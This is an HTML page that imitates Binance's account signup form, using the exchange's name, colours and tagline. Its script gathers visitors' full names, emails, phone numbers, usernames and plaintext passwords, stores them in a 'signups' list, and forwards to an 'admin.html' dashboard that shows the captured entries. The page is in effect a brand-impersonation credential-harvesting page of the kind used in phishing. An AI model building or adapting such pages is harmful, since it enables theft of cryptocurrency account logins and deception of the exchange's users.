<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Binance - Create Account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #0f0f0f 0%, #1a1a2e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            max-width: 550px;
            width: 100%;
            padding: 50px 40px;
        }
        
        .logo-section {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo {
            color: #f3ba2f;
            font-size: 40px;
            font-weight: bold;
            margin-bottom: 5px;
        }
        
        .tagline {
            color: #999;
            font-size: 13px;
            letter-spacing: 1px;
        }
        
        h1 {
            color: #111;
            font-size: 28px;
            margin-top: 30px;
            margin-bottom: 25px;
            text-align: center;
        }
        
        .form-group {
            margin-bottom: 18px;
        }
        
        label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        
        input, textarea {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #e0e0e0;
            border-radius: 6px;
            font-size: 14px;
            font-family: inherit;
            transition: all 0.3s ease;
        }
        
        input:focus, textarea:focus {
            outline: none;
            border-color: #f3ba2f;
            box-shadow: 0 0 0 3px rgba(243, 186, 47, 0.1);
        }
        
        textarea {
            resize: vertical;
            min-height: 90px;
        }
        
        .row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }
        
        .row .form-group {
            margin-bottom: 0;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: #f3ba2f;
            color: #000;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }
        
        button:hover {
            background: #e0a91f;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(243, 186, 47, 0.3);
        }
        
        .footer-links {
            text-align: center;
            margin-top: 25px;
            font-size: 13px;
            color: #666;
        }
        
        .footer-links a {
            color: #f3ba2f;
            text-decoration: none;
            font-weight: 600;
            margin: 0 8px;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .message {
            padding: 14px;
            border-radius: 6px;
            margin-bottom: 20px;
            text-align: center;
            font-weight: 600;
            font-size: 14px;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <div class="logo">₿ BINANCE</div>
            <div class="tagline">THE WORLD'S LEADING CRYPTO EXCHANGE</div>
        </div>

        <h1>Create Your Free Account</h1>

        <div id="message"></div>

        <form id="signupForm">
            <div class="form-group">
                <label for="fullname">Full Name *</label>
                <input type="text" id="fullname" name="fullname" placeholder="John Doe" required>
            </div>

            <div class="row">
                <div class="form-group">
                    <label for="email">Email Address *</label>
                    <input type="email" id="email" name="email" placeholder="john@example.com" required>
                </div>
                <div class="form-group">
                    <label for="phone">Phone Number *</label>
                    <input type="tel" id="phone" name="phone" placeholder="+1 (555) 123-4567" required>
                </div>
            </div>

            <div class="row">
                <div class="form-group">
                    <label for="username">Username *</label>
                    <input type="text" id="username" name="username" placeholder="johndoe123" required>
                </div>
                <div class="form-group">
                    <label for="password">Password *</label>
                    <input type="password" id="password" name="password" placeholder="••••••••" required>
                </div>
            </div>

            <div class="row">
                <div class="form-group">
                    <label for="country">Country *</label>
                    <input type="text" id="country" name="country" placeholder="United States" required>
                </div>
                <div class="form-group">
                    <label for="referral">Referral Code</label>
                    <input type="text" id="referral" name="referral" placeholder="Optional">
                </div>
            </div>

            <div class="form-group">
                <label for="message">Why do you want to join Binance? *</label>
                <textarea id="message" name="message" placeholder="Tell us about your interest in cryptocurrency trading..." required></textarea>
            </div>

            <button type="submit">Create Account</button>
        </form>

        <div class="footer-links">
            <a href="admin.html">📊 Admin Dashboard</a> | 
            <a href="login.html">Already have account?</a>
        </div>
    </div>

    <script>
        document.getElementById('signupForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const formData = {
                id: Date.now(),
                fullname: document.getElementById('fullname').value,
                email: document.getElementById('email').value,
                username: document.getElementById('username').value,
                password: document.getElementById('password').value,
                country: document.getElementById('country').value,
                phone: document.getElementById('phone').value,
                referral: document.getElementById('referral').value || 'None',
                message: document.getElementById('message').value,
                timestamp: new Date().toLocaleString(),
                date: new Date().toLocaleDateString()
            };

            let signups = JSON.parse(localStorage.getItem('signups')) || [];
            signups.push(formData);
            localStorage.setItem('signups', JSON.stringify(signups));

            const messageDiv = document.getElementById('message');
            messageDiv.className = 'message success';
            messageDiv.innerHTML = '✅ Account created successfully! <br> Redirecting to dashboard in 2 seconds...';

            document.getElementById('signupForm').reset();

            setTimeout(() => {
                window.location.href = 'admin.html';
            }, 2000);
        });
    </script>
</body>
</html>
